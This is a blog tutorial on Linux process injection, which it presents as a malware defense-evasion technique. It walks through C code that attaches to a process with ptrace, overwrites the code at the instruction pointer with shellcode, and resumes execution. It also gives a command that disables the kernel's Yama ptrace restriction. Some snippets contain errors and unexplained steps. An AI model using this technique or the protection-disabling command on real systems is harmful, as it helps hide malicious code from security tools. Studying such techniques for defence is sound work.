---
layout:  post
title:  "Linux: Local Process Injection"
---
**Process Injection** is a defense evasion technique that is often employed within malware and entails a method of executing *arbitrary code* in the address space of a separate live process, therefore, allowing access to the process's memory, system resources and possibly network resources.

Execution via process injection may also provide a way to evade detection from security products *(anti-viruses)* because the execution is masked under a legitimate process. 

There are other useful purposes of process injection, these include the use of *debuggers* to hook and debug applications, also some *antivirus* softwares inject into web browsers to monitor traffic and also block malicious web content. 


There are two main ways that code can be injected into a process and these are as follows:

1. A *legitimate process* is started and arbitrary code is injected into the process for execution.
2. Code injection into an already running live remote process possibly a daemon process. *(this comes with a disadvantage since we cannot inject into a process owned by another user)*.


For this first part, we will simply be introducing the core concepts of the `ptrace` syscall and how this can be used to inject shellcode for process injection.

The second part of this [series](https://mutur4.github.io/2023/10/04/Linux-Remote-Process-Injection.html) we will be introducing a more advanced process injection technique inspired by the Windows **_VirtualAllocEx_** and **_CreateRemoteThread_** to inject code after process enumeration. 


### Ptrace System Call 

The *ptrace()* system call in Linux, is a system call that provides a means by which one process can control and observe the execution of another process and examine and change its *memory* and *register* values. The signature for the system call is as follows:

```bash
long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
```

The arguments passed to the function are :
* `pid` - This is the process identifier of the process in which we will inject malicious code into. 
* `ptrace request` - These are a group of constants that are accepted by *ptrace()* used to specify the action to be performed. A list of these requests and their usage are specified in *ptrace()'s* man page `man ptrace`.

The *addr* and the *data* arguments are passed to the system call depending on the request type passed to *ptrace()* , this is because, some requests can ignore or use these values.

To understand how *ptrace()* can be used to attach to a process, we will write a simple `C` application whose code snippet is as follows:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

int main(int argc, char **argv){
	pid_t pid;
	if (argc < 2){
		fprintf(stderr, "Usage %s <pid>\n", argv[0]);
	}
	pid = atoi(argv[1]);
	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0){
		perror("ptrace()");
		_exit(-1);
	}
	waitpid(pid, NULL, 0);
	fprintf(stderr, "* Attached to the process %d \n", pid);
	return 0;
}
```
> **NOTE**: _Using the above code snippet, we will add more code to expand its functionality._ 

The above code will simply take the `pid` of a process as its command line argz and try to attach to that process; *ptrace()* takes the request **PTRACE_ATTACH** that ignores the *addr* and the *data* arguments, therefore, these values are **NULL**ified. An attachment to a process may fail with a **Permission denied** error because of one of the following reasons:
* If the process is owned by another user, *i.e trying to inject into a root process*
* If the process is attached to another process *i.e **debugger** or Linux utilities like __ptrace__, __strace__ etc..* 

Once the process is succesfully attached, it is stopped by sending a `SIGTRAP` signal and *waitpid()* is used to wait for the delivery of the signal, and after that, we now have full control of the attached process.

The following is the code for the process that we will try to attach to:

```c
#include <unistd.h>
#include <stdio.h>
#include <unistd.h>

int main(void){
	fprintf(stdout, "*pid %d \n", getpid());
	sleep(1000);
	return 0;
}
```  
When executed the above code returns its process identifier *(pid)* and *sleep's* for `1000` seconds giving use time to attach to it. Running our injector application above, will attach to this process giving use full control of the process' resources.

### Controllling Registers

The request `PTRACE_GETREGS`, allows us to access all the registers in the attached process. The *user_regs_struct* structure from the `user.h` header is used to store these registers and this is passed as the third argument *data*.

To this moment, we have only attached to a process; we can now access its register values. These are the registers at the point when the `SIGTRAP` was received.

```c 
	fprintf(stdout, "* Getting Registers \n", pid);
	
	struct user_regs_struct regs;

	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs)) < 0){
		perror("PTRACE_GETREGS");
		_exit(-1);
	}
	
	fprintf(stdout, "(rip) %p\n", regs.rip);
	fprintf(stdout, "(rsp) %p\n", regs.rsp);
	fprintf(stdout, "(rbp) %p\n", regs.rbp);

``` 
The values of all the registers in the process are captured and can now be accessed from the above mentioned `user_regs_struct` variable.

The `PTRACE_SETREGS` request, allows us to set the value of these registers to any value of our choice. This is where our control comes in handly since we can set the value of `RIP` to point to the address of our injected code and return execution back to the process. There are a couple of places where code can be injected:

1. The code can be inserted in the current instruction that is being executed, this is the current address held by the `rip` register since this region will obviously be executable.
2. Code can be injected on the stack and execution redirected there, this is always a disavantage because most stacks are not executable as a protection against stack buffer overflow via shellcode injection.
3. Code an also be injected in any memory region mapped to be executable, this technique will be used in the next post.
4. Code injection in the executable's *code cave*. A code cave can be defined as a region with a contigous series of unused or NULL bytes that exists when a program is loaded in memory, this happens because of page aligments.

For simplicity, we will inject code in the current address held by the `rip` register. The following is a block of code that will be used to inject malicious code into a chosen memory address. 

```c
void inject_code(uint64_t *payload, pid_t pid, unsigned long *dest){
        for(size_t i = 0; i < strlen(SHELLCODE); i+= 8, payload++, dest++){
                if (ptrace(PTRACE_POKETEXT, pid, dest, *payload) < 0){
                        perror("POKTEXT");
                        _exit(-1);
                }
        } 
}

```
The ptrace request `PTRACE_POKETEXT` will take the `addr` and the `data` pointers as arguments and whatever is in `data` will be copied to `addr`.
Since this a 64-bit application we increment the iterator with 8 bytes, since with each copy, 8-bytes of data is copied. 

The `PTRACE_PEEKTEXT` request does the opposite (reading data) and can be used to read data from the injected process. 

### Code Execution

Since the current address where `rip` was pointing to is overwritten with our malicious code we now have to return registers back to the process. As stated above the request `PTRACE_SETREGS` is used. This takes the `data` argument which is the address of the `user_regs_struct` structure.
```c
	struct user_regs_struct new_regs;
        
	memcpy(&new_regs, &regs, sizeof(struct user_regs_struct));
        new_regs.rip += 2;

        if(ptrace(PTRACE_SETREGS, pid, NULL, &new_regs) < 0){
                perror("PTRACE_SETREGS");
                _exit(-1);
        }

        if(ptrace(PTRACE_CONT, pid, NULL, NULL) < 0){
                perror("PTRACE_DETACH");
                _exit(-1);
        }

        fprintf(stdout, "* successfully injected code into the process");
```
The `PTRACE_CONT` request will resume the process from its saved stated, this will also subtract 2 bytes from the instruction pointer, therefore we add 2 bytes *(idk the reason)* to exactly point the instruction pointer to the address of our injected shellcode.The `PTRACE_DETACH` request will resume the execution of the paused process to execute the injected code. The complete code can be located at [inject.c](https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/simple-ptrace-injection.c). 

The injected code is executed successfully but the main disadvantage is after malicious code execution, that process will also terminate *(the process we injected into...)* 

### Conclusion

This was a simple introduction to process injection, where we injected shellcode into a live process *(that we basically started/initiated)* **boring right!!** :squinting_face_with_tongue:. In the next part, we will look at more advanced process injection techniques where code injection will not affect the execution of another process by introducing *'remote threading'*.


There is one **shortcoming** that prevents injection via the `ptrace` syscall. The kernel might be configured to prevent any process from using `ptrace` on another process it did not create. This can be turned off using the following bash commands.

```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

### References 

- [1] https://papers.vx-underground.org/papers/Linux/Process%20Injection/Infecting%20Running%20Processes.pdf

